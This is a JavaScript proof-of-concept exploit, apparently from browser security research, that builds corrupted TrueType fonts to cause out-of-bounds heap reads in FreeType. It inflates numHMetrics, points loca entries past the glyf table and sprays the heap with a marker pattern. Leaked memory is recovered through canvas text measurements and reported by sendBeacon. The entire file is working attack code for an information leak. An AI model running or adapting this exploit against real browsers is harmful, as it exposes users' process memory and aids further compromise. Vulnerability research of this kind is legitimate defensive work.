// p252 — FreeType OOB read info leak via corrupted hmtx/loca
//
// V190A confirmed FreeType accepts fonts with numHMetrics=0xFFFF but only 2 entries.
// When FreeType reads hmtx[i] for glyph i >= 2, it reads past the table boundary.
// The OOB data appears as advance widths — measurable via canvas measureText().
//
// Strategy:
// 1. Build TTF with numHMetrics=N but hmtx has only 2 real entries
// 2. cmap maps chars 0x41-0x5A (A-Z) to glyph indices 0..25
// 3. Render each char, measure advance width via measureText()
// 4. Known entries: glyph 0 = 500, glyph 1 = 600
// 5. Glyphs 2+ read OOB from heap → advance width = whatever uint16 is in memory
// 6. If advance widths for glyphs 2+ are NOT 500 or 600, we're reading heap data
//
// Also tests: loca entries pointing slightly past glyf end (not 4GB, just 100 bytes)
//
// Beacon prefix: V252-

(function() {
  var Q = [], S = false;
  function B(tag, body) {
    Q.push([tag, body || '']);
    if (!S) flush();
  }
  function flush() {
    if (!Q.length) { S = false; return; }
    S = true;
    var it = Q.shift();
    try {
      navigator.sendBeacon('/beacon/V252-' + it[0] + '?t=' + Date.now(), it[1]);
    } catch(e) {}
    setTimeout(flush, 20);
  }

  function u16(v) { return [(v >> 8) & 0xFF, v & 0xFF]; }
  function u32(v) { return [(v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF]; }
  function s16(v) { if (v < 0) v = 0x10000 + v; return u16(v); }

  B('BOOT');

  // ========== TEST A: hmtx OOB read via inflated numHMetrics ==========
  function testA() {
    B('A-START');

    var NUM_GLYPHS = 28; // .notdef + 26 letters + 1 extra
    var REAL_HMETRICS = 2;  // Only 2 real hmtx entries
    var FAKE_HMETRICS = NUM_GLYPHS; // But header claims all glyphs have entries

    var numTables = 9;
    var headerSize = 12 + numTables * 16;

    // head table (54 bytes)
    var head = [].concat(
      u16(0), u16(1), u16(0), u16(1), u32(0), u32(0x5F0F3CF5),
      u16(0x000B), u16(1000),
      u32(0), u32(0), u32(0), u32(0),
      s16(0), s16(0), s16(1000), s16(800),
      u16(0), u16(8), s16(2), s16(1), s16(0)
    );
    while (head.length % 4) head.push(0);

    // hhea — claims FAKE_HMETRICS entries
    var hhea = [].concat(
      u16(0), u16(1),
      s16(800), s16(-200), s16(0),
      u16(1200), s16(0), s16(0), s16(1200),
      s16(1), s16(0), s16(0),
      s16(0), s16(0), s16(0), s16(0),
      s16(0),
      u16(FAKE_HMETRICS) // <-- THE KEY: claims 28 entries
    );
    while (hhea.length % 4) hhea.push(0);

    // maxp
    var maxp = [].concat(
      u16(0), u16(1), u16(NUM_GLYPHS),
      u16(4), u16(1), u16(0), u16(0),
      u16(1), u16(1), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0)
    );
    while (maxp.length % 4) maxp.push(0);

    // post
    var post = [].concat(
      u16(0), u16(3), u32(0), s16(-100), s16(50),
      u32(0), u32(0), u32(0), u32(0), u32(0)
    );
    while (post.length % 4) post.push(0);

    // name
    var nameStr = 'Leak252A';
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) nameBytes.push(0, nameStr.charCodeAt(i));
    var nameRecs = [];
    for (var nid = 0; nid < 7; nid++) {
      nameRecs = nameRecs.concat(u16(3), u16(1), u16(0x0409), u16(nid), u16(nameBytes.length), u16(0));
    }
    var nameTab = [].concat(u16(0), u16(7), u16(6 + 7 * 12), nameRecs, nameBytes);
    while (nameTab.length % 4) nameTab.push(0);

    // cmap — format 4, maps A-Z (65-90) to glyphs 1-26, rest to .notdef (0)
    var segCount = 2; // one segment for A-Z, one end segment
    var cmap4 = [].concat(
      u16(4),                    // format
      u16(8 + segCount * 8 + 2), // length
      u16(0),                    // language
      u16(segCount * 2),         // segCountX2
      u16(2), u16(1), u16(2),   // searchRange, entrySelector, rangeShift
      // endCode: 90 (Z), 0xFFFF
      u16(90), u16(0xFFFF),
      u16(0), // reservedPad
      // startCode: 65 (A), 0xFFFF
      u16(65), u16(0xFFFF),
      // idDelta: 1-65=-64, 1
      s16(-64), s16(1),
      // idRangeOffset: 0, 0
      u16(0), u16(0)
    );
    var cmapTab = [].concat(
      u16(0), u16(1), u16(3), u16(1), u32(12),
      cmap4
    );
    while (cmapTab.length % 4) cmapTab.push(0);

    // hmtx — ONLY 2 real entries (8 bytes total)
    // But header says there are 28 entries (112 bytes expected)
    // Entry 0: advance=500, lsb=0 (for .notdef)
    // Entry 1: advance=600, lsb=50 (for glyph 1 = 'A')
    // Entries 2-27: NOT PRESENT → FreeType reads OOB
    var hmtx = [].concat(
      u16(500), s16(0),   // glyph 0: .notdef
      u16(600), s16(50)   // glyph 1: 'A'
      // glyphs 2-27: MISSING — OOB territory
    );
    while (hmtx.length % 4) hmtx.push(0);

    // loca — long format, all glyphs point to offset 0 (simple box glyph)
    var loca = [];
    for (var g = 0; g <= NUM_GLYPHS; g++) loca = loca.concat(u32(0));
    while (loca.length % 4) loca.push(0);

    // glyf — minimal box glyph at offset 0
    var glyf = [].concat(
      s16(1),                    // numberOfContours
      s16(0), s16(0),           // xMin, yMin
      s16(500), s16(700),       // xMax, yMax
      u16(3),                    // endPtsOfContours[0] = 3 (4 points)
      u16(0),                    // instructionLength
      // flags: 4 points, all on-curve, x and y are 1-byte positive
      0x37, 0x27, 0x37, 0x27,
      // x coords (relative): 0, 500, 0, -500
      0, 0xF4, 0x01, 0, 0xF4, 0x01,
      // y coords (relative): 0, 0, 700, 0
      0, 0, 0xBC, 0x02, 0
    );
    while (glyf.length % 4) glyf.push(0);

    // Assemble
    var tableOrder = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post'];
    var tableData = { cmap: cmapTab, glyf: glyf, head: head, hhea: hhea, hmtx: hmtx, loca: loca, maxp: maxp, name: nameTab, post: post };

    var offset = headerSize;
    var directory = [];
    var allData = [];
    for (var ti = 0; ti < tableOrder.length; ti++) {
      var tag = tableOrder[ti];
      var data = tableData[tag];
      var tagB = [tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3)];
      directory = directory.concat(tagB, u32(0), u32(offset), u32(data.length));
      allData = allData.concat(data);
      offset += data.length;
    }

    var hdr = [].concat(
      u32(0x00010000), u16(numTables),
      u16(128), u16(3), u16(numTables * 16 - 128)
    );

    var font = new Uint8Array(hdr.concat(directory, allData));
    B('A-FONT-' + font.length + 'B-HMTX-' + hmtx.length + 'B');

    // Load font
    var blob = new Blob([font], {type: 'font/ttf'});
    var url = URL.createObjectURL(blob);

    var ff = new FontFace('Leak252A', 'url("' + url + '")');
    ff.load().then(function(loaded) {
      B('A-LOADED');
      document.fonts.add(loaded);

      // Measure advance widths for A-Z
      var c = document.createElement('canvas');
      c.width = 2000; c.height = 100;
      var ctx = c.getContext('2d');
      ctx.font = '48px "Leak252A"';

      var widths = [];
      var nonStandard = 0;
      for (var ch = 65; ch <= 90; ch++) {
        var char = String.fromCharCode(ch);
        var m = ctx.measureText(char);
        var w = Math.round(m.width * 100) / 100;
        widths.push(char + '=' + w);
        // Glyph index = ch - 64 (1 for A, 2 for B, etc.)
        // Glyph 1 (A) should have advance 600
        // Glyphs 2+ should read OOB
        if (ch > 65 && w !== widths[0].split('=')[1]) {
          nonStandard++;
        }
      }

      B('A-WIDTHS', widths.join(' '));
      B('A-NONSTD-' + nonStandard);

      // Also measure pairs to detect advance differences
      var pairWidths = [];
      for (var ch = 65; ch <= 72; ch++) {
        var pair = String.fromCharCode(ch) + String.fromCharCode(ch);
        var pw = Math.round(ctx.measureText(pair).width * 100) / 100;
        var sw = Math.round(ctx.measureText(String.fromCharCode(ch)).width * 100) / 100;
        pairWidths.push(String.fromCharCode(ch) + ':' + sw + '/' + pw);
      }
      B('A-PAIRS', pairWidths.join(' '));

      // Render all chars and read pixel data
      ctx.clearRect(0, 0, 2000, 100);
      ctx.fillStyle = '#000';
      for (var ch = 65; ch <= 90; ch++) {
        ctx.fillText(String.fromCharCode(ch), (ch - 65) * 60, 60);
      }
      var px = ctx.getImageData(0, 0, 2000, 100).data;
      var nonZeroCols = 0;
      for (var x = 0; x < 2000; x++) {
        var colHasPixel = false;
        for (var y = 0; y < 100 && !colHasPixel; y++) {
          if (px[(y * 2000 + x) * 4 + 3] > 0) colHasPixel = true;
        }
        if (colHasPixel) nonZeroCols++;
      }
      B('A-RENDERED-COLS-' + nonZeroCols);

      URL.revokeObjectURL(url);
      setTimeout(testB, 1000);
    }).catch(function(e) {
      B('A-FAIL-' + e.message.substring(0, 40));
      URL.revokeObjectURL(url);
      setTimeout(testB, 500);
    });
  }

  // ========== TEST B: loca slight OOB (past glyf by 100 bytes) ==========
  function testB() {
    B('B-START');

    var NUM_GLYPHS = 4;
    var numTables = 9;
    var headerSize = 12 + numTables * 16;

    var head = [].concat(
      u16(0), u16(1), u16(0), u16(1), u32(0), u32(0x5F0F3CF5),
      u16(0x000B), u16(1000),
      u32(0), u32(0), u32(0), u32(0),
      s16(0), s16(0), s16(1000), s16(800),
      u16(0), u16(8), s16(2), s16(1), s16(0)
    );
    while (head.length % 4) head.push(0);

    var hhea = [].concat(
      u16(0), u16(1), s16(800), s16(-200), s16(0),
      u16(1000), s16(0), s16(0), s16(1000),
      s16(1), s16(0), s16(0),
      s16(0), s16(0), s16(0), s16(0), s16(0),
      u16(NUM_GLYPHS)
    );
    while (hhea.length % 4) hhea.push(0);

    var maxp = [].concat(
      u16(0), u16(1), u16(NUM_GLYPHS),
      u16(4), u16(1), u16(0), u16(0),
      u16(1), u16(1), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0)
    );
    while (maxp.length % 4) maxp.push(0);

    var post = [].concat(
      u16(0), u16(3), u32(0), s16(-100), s16(50),
      u32(0), u32(0), u32(0), u32(0), u32(0)
    );
    while (post.length % 4) post.push(0);

    var nameStr = 'Leak252B';
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) nameBytes.push(0, nameStr.charCodeAt(i));
    var nameRecs = [];
    for (var nid = 0; nid < 7; nid++) {
      nameRecs = nameRecs.concat(u16(3), u16(1), u16(0x0409), u16(nid), u16(nameBytes.length), u16(0));
    }
    var nameTab = [].concat(u16(0), u16(7), u16(6 + 7 * 12), nameRecs, nameBytes);
    while (nameTab.length % 4) nameTab.push(0);

    // cmap: A=1, B=2, C=3
    var cmap4 = [].concat(
      u16(4), u16(28), u16(0), u16(4),
      u16(2), u16(0), u16(2),
      u16(67), u16(0xFFFF), u16(0),
      u16(65), u16(0xFFFF),
      s16(-64), s16(1),
      u16(0), u16(0)
    );
    var cmapTab = [].concat(u16(0), u16(1), u16(3), u16(1), u32(12), cmap4);
    while (cmapTab.length % 4) cmapTab.push(0);

    var hmtx = [].concat(
      u16(500), s16(0), u16(600), s16(0),
      u16(600), s16(0), u16(600), s16(0)
    );
    while (hmtx.length % 4) hmtx.push(0);

    // glyf — 20 byte simple glyph
    var glyf = [].concat(
      s16(1), s16(0), s16(0), s16(500), s16(700),
      u16(3), u16(0),
      0x37, 0x27, 0x37, 0x27,
      0, 0xF4, 0x01, 0, 0xF4, 0x01,
      0, 0, 0xBC, 0x02, 0
    );
    while (glyf.length % 4) glyf.push(0);
    var glyfLen = glyf.length;

    // loca — long format
    // Glyph 0: offset 0 (valid)
    // Glyph 1: offset 0 (valid)
    // Glyph 2: offset glyfLen + 50 (50 bytes past glyf end!)
    // Glyph 3: offset glyfLen + 100 (100 bytes past!)
    var loca = [].concat(
      u32(0), u32(0),
      u32(glyfLen + 50),
      u32(glyfLen + 100),
      u32(glyfLen + 150)
    );
    while (loca.length % 4) loca.push(0);

    // Assemble
    var tableOrder = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post'];
    var tableDataMap = { cmap: cmapTab, glyf: glyf, head: head, hhea: hhea, hmtx: hmtx, loca: loca, maxp: maxp, name: nameTab, post: post };

    var offset = headerSize;
    var directory = [];
    var allData = [];
    for (var ti = 0; ti < tableOrder.length; ti++) {
      var tag = tableOrder[ti];
      var data = tableDataMap[tag];
      var tagB = [tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3)];
      directory = directory.concat(tagB, u32(0), u32(offset), u32(data.length));
      allData = allData.concat(data);
      offset += data.length;
    }

    var hdr = [].concat(u32(0x00010000), u16(9), u16(128), u16(3), u16(9 * 16 - 128));
    var font = new Uint8Array(hdr.concat(directory, allData));
    B('B-FONT-' + font.length + 'B-GLYF-' + glyfLen + 'B');

    var blob = new Blob([font], {type: 'font/ttf'});
    var url = URL.createObjectURL(blob);

    var ff = new FontFace('Leak252B', 'url("' + url + '")');
    ff.load().then(function(loaded) {
      B('B-LOADED');
      document.fonts.add(loaded);

      var c = document.createElement('canvas');
      c.width = 800; c.height = 100;
      var ctx = c.getContext('2d');
      ctx.font = '48px "Leak252B"';

      // A = glyph 1 (valid loca), B = glyph 2 (loca OOB), C = glyph 3 (loca OOB)
      var wA = ctx.measureText('A').width;
      var wB = ctx.measureText('B').width;
      var wC = ctx.measureText('C').width;
      B('B-WIDTHS', 'A=' + wA.toFixed(2) + ' B=' + wB.toFixed(2) + ' C=' + wC.toFixed(2));

      // Render and check pixels
      ctx.clearRect(0, 0, 800, 100);
      ctx.fillStyle = '#000';
      ctx.fillText('A', 10, 60);
      ctx.fillText('B', 200, 60);
      ctx.fillText('C', 400, 60);
      var px = ctx.getImageData(0, 0, 800, 100).data;

      // Count pixels in each character region
      function countPixels(x0, x1) {
        var n = 0;
        for (var x = x0; x < x1; x++) {
          for (var y = 0; y < 100; y++) {
            if (px[(y * 800 + x) * 4 + 3] > 0) n++;
          }
        }
        return n;
      }

      var pxA = countPixels(0, 150);
      var pxB = countPixels(150, 350);
      var pxC = countPixels(350, 600);
      B('B-PIXELS', 'A=' + pxA + ' B=' + pxB + ' C=' + pxC);

      URL.revokeObjectURL(url);
      setTimeout(testC, 1000);
    }).catch(function(e) {
      B('B-FAIL-' + e.message.substring(0, 40));
      URL.revokeObjectURL(url);
      setTimeout(testC, 500);
    });
  }

  // ========== TEST C: Adjacent allocation spray + hmtx OOB read ==========
  function testC() {
    B('C-START');

    // Spray known pattern before loading the font
    // fastMalloc allocations near the font buffer should contain our pattern
    var SPRAY_SIZE = 200;
    var SPRAY_COUNT = 2000;
    var sprays = [];
    for (var s = 0; s < SPRAY_COUNT; s++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var v = new Uint8Array(ab);
      // Fill with recognizable pattern: 0xDE 0xAD followed by 2-byte index
      for (var j = 0; j < SPRAY_SIZE; j += 4) {
        v[j] = 0xDE;
        v[j + 1] = 0xAD;
        v[j + 2] = (s >> 8) & 0xFF;
        v[j + 3] = s & 0xFF;
      }
      sprays.push(ab);
    }
    B('C-SPRAYED-' + SPRAY_COUNT);

    // Now build the same font as test A (hmtx OOB) but load AFTER spray
    // The font buffer will be allocated near our spray buffers
    // hmtx OOB reads should hit our 0xDEAD pattern
    var NUM_GLYPHS = 28;
    var numTables = 9;
    var headerSize = 12 + numTables * 16;

    // Reuse test A font structure but with different family name
    var head = [].concat(
      u16(0), u16(1), u16(0), u16(1), u32(0), u32(0x5F0F3CF5),
      u16(0x000B), u16(1000),
      u32(0), u32(0), u32(0), u32(0),
      s16(0), s16(0), s16(1000), s16(800),
      u16(0), u16(8), s16(2), s16(1), s16(0)
    );
    while (head.length % 4) head.push(0);

    var hhea = [].concat(
      u16(0), u16(1), s16(800), s16(-200), s16(0),
      u16(1200), s16(0), s16(0), s16(1200),
      s16(1), s16(0), s16(0),
      s16(0), s16(0), s16(0), s16(0), s16(0),
      u16(NUM_GLYPHS)
    );
    while (hhea.length % 4) hhea.push(0);

    var maxp = [].concat(
      u16(0), u16(1), u16(NUM_GLYPHS),
      u16(4), u16(1), u16(0), u16(0),
      u16(1), u16(1), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0), u16(0)
    );
    while (maxp.length % 4) maxp.push(0);

    var post = [].concat(
      u16(0), u16(3), u32(0), s16(-100), s16(50),
      u32(0), u32(0), u32(0), u32(0), u32(0)
    );
    while (post.length % 4) post.push(0);

    var nameStr = 'Leak252C';
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) nameBytes.push(0, nameStr.charCodeAt(i));
    var nameRecs = [];
    for (var nid = 0; nid < 7; nid++) {
      nameRecs = nameRecs.concat(u16(3), u16(1), u16(0x0409), u16(nid), u16(nameBytes.length), u16(0));
    }
    var nameTab = [].concat(u16(0), u16(7), u16(6 + 7 * 12), nameRecs, nameBytes);
    while (nameTab.length % 4) nameTab.push(0);

    var cmap4 = [].concat(
      u16(4), u16(28), u16(0), u16(4),
      u16(2), u16(0), u16(2),
      u16(90), u16(0xFFFF), u16(0),
      u16(65), u16(0xFFFF),
      s16(-64), s16(1),
      u16(0), u16(0)
    );
    var cmapTab = [].concat(u16(0), u16(1), u16(3), u16(1), u32(12), cmap4);
    while (cmapTab.length % 4) cmapTab.push(0);

    // hmtx: only 2 entries — KNOWN values 500 and 600
    var hmtx = [].concat(u16(500), s16(0), u16(600), s16(50));
    while (hmtx.length % 4) hmtx.push(0);

    var loca = [];
    for (var g = 0; g <= NUM_GLYPHS; g++) loca = loca.concat(u32(0));
    while (loca.length % 4) loca.push(0);

    var glyf = [].concat(
      s16(1), s16(0), s16(0), s16(500), s16(700),
      u16(3), u16(0),
      0x37, 0x27, 0x37, 0x27,
      0, 0xF4, 0x01, 0, 0xF4, 0x01,
      0, 0, 0xBC, 0x02, 0
    );
    while (glyf.length % 4) glyf.push(0);

    var tableOrder = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post'];
    var tableDataMap = { cmap: cmapTab, glyf: glyf, head: head, hhea: hhea, hmtx: hmtx, loca: loca, maxp: maxp, name: nameTab, post: post };

    var off = headerSize;
    var dir = [];
    var allD = [];
    for (var ti = 0; ti < tableOrder.length; ti++) {
      var tag = tableOrder[ti];
      var data = tableDataMap[tag];
      var tagB = [tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3)];
      dir = dir.concat(tagB, u32(0), u32(off), u32(data.length));
      allD = allD.concat(data);
      off += data.length;
    }

    var hdr = [].concat(u32(0x00010000), u16(9), u16(128), u16(3), u16(9 * 16 - 128));
    var font = new Uint8Array(hdr.concat(dir, allD));
    B('C-FONT-' + font.length + 'B');

    var blob = new Blob([font], {type: 'font/ttf'});
    var url = URL.createObjectURL(blob);

    var ff = new FontFace('Leak252C', 'url("' + url + '")');
    ff.load().then(function(loaded) {
      B('C-LOADED');
      document.fonts.add(loaded);

      var c = document.createElement('canvas');
      c.width = 2000; c.height = 100;
      var ctx = c.getContext('2d');
      ctx.font = '48px "Leak252C"';

      // Measure A-Z advance widths
      // A = glyph 1 (advance=600 from hmtx[1])
      // B-Z = glyphs 2-26 (advance = OOB read → should be heap data)
      // If we see 0xDEAD as advance width (56749 in decimal), spray hit confirmed
      var widths = [];
      var deadHits = 0;
      for (var ch = 65; ch <= 90; ch++) {
        var w = ctx.measureText(String.fromCharCode(ch)).width;
        var rawW = Math.round(w * 1000 / 48); // Scale back to font units
        widths.push(String.fromCharCode(ch) + '=' + w.toFixed(1) + '(' + rawW + ')');
        if (rawW === 0xDEAD || rawW === 0xADDE) deadHits++;
      }
      B('C-WIDTHS', widths.join(' '));
      B('C-DEAD-HITS-' + deadHits);

      // Check if widths vary (indicating real OOB reads vs default value)
      var uniqueWidths = {};
      for (var ch = 66; ch <= 90; ch++) {
        var w = ctx.measureText(String.fromCharCode(ch)).width;
        uniqueWidths[Math.round(w * 10)] = true;
      }
      var numUnique = Object.keys(uniqueWidths).length;
      B('C-UNIQUE-WIDTHS-' + numUnique);

      URL.revokeObjectURL(url);
    }).catch(function(e) {
      B('C-FAIL-' + e.message.substring(0, 40));
      URL.revokeObjectURL(url);
    });

    setTimeout(function() { B('DONE'); }, 8000);
  }

  // Start
  setTimeout(testA, 100);
})();
